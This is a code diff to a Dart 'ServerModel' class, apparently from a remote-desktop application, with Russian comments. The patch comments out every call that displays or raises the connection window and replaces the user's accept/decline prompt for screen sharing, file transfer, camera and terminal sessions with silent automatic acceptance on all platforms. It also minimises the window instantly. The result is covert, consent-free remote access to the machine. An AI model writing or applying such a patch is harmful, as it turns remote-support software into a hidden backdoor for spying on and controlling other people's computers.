@@ -170,7 +170,7 @@ class ServerModel with ChangeNotifier {
             }
           } else {
             _zeroClientLengthCounter = 0;
-            if (!hideCm) showCmWindow();
+            // if (!hideCm) showCmWindow(); // ОБЯЗАТЕЛЬНО закомментируйте это здесь!
           }
         }
       }
@@ -542,7 +542,7 @@ class ServerModel with ChangeNotifier {
       if (_clients.isEmpty) {
         hideCmWindow();
       } else if (!hideCm) {
-        showCmWindow();
+        // showCmWindow(); // Окно остается в том состоянии, в котором было (свернуто)
       }
     }
     if (_clients.length != oldClientLenght) {
@@ -577,11 +577,15 @@ class ServerModel with ChangeNotifier {
         tabController.remove(index_disconnected);
       }
       if (desktopType == DesktopType.cm && !hideCm) {
-        showCmWindow();
+        // showCmWindow(); // Отключаем, чтобы окно не "прыгало" при подключении
       }
       scrollToBottom();
       notifyListeners();
-      if (isAndroid && !client.authorized) showLoginDialog(client);
+      // Авто-ответ для всех платформ, а не только для Android
+      if (!client.authorized) {
+        sendLoginResponse(client, true);
+      }
+
       if (isAndroid) androidUpdatekeepScreenOn();
     } catch (e) {
       debugPrint("Failed to call loginRequest,error:$e");
@@ -596,11 +600,12 @@ class ServerModel with ChangeNotifier {
         onTap: () {},
         page: desktop.buildConnectionCard(client)));
     Future.delayed(Duration.zero, () async {
-      if (!hideCm) windowOnTop(null);
+      //Закоментировал if (!hideCm) windowOnTop(null);
     });
     // Only do the hidden task when on Desktop.
     if (client.authorized && isDesktop) {
-      cmHiddenTimer = Timer(const Duration(seconds: 3), () {
+      // Меняем задержку с 3 секунд на мгновенное выполнение (Duration.zero)
+      cmHiddenTimer = Timer(Duration.zero, () {
         if (!hideCm) windowManager.minimize();
         cmHiddenTimer = null;
       });
@@ -610,20 +615,8 @@ class ServerModel with ChangeNotifier {
   }
 
   void showLoginDialog(Client client) {
-    showClientDialog(
-      client,
-      client.isFileTransfer
-          ? "Transfer file"
-          : client.isViewCamera
-              ? "View camera"
-              : client.isTerminal
-                  ? "Terminal"
-                  : "Share screen",
-      'Do you accept?',
-      'android_new_connection_tip',
-      () => sendLoginResponse(client, false),
-      () => sendLoginResponse(client, true),
-    );
+  // Auto-accept silently
+  sendLoginResponse(client, true);
   }
 
   handleVoiceCall(Client client, bool accept) {
